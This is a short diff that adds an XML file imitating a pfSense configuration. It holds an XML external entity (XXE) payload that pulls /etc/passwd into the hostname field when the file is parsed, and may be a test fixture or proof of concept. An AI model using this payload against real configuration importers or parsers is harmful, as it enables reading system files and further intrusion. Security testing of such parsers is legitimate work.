@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE pfsense [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<pfsense><system><hostname>&xxe;</hostname></system></pfsense>
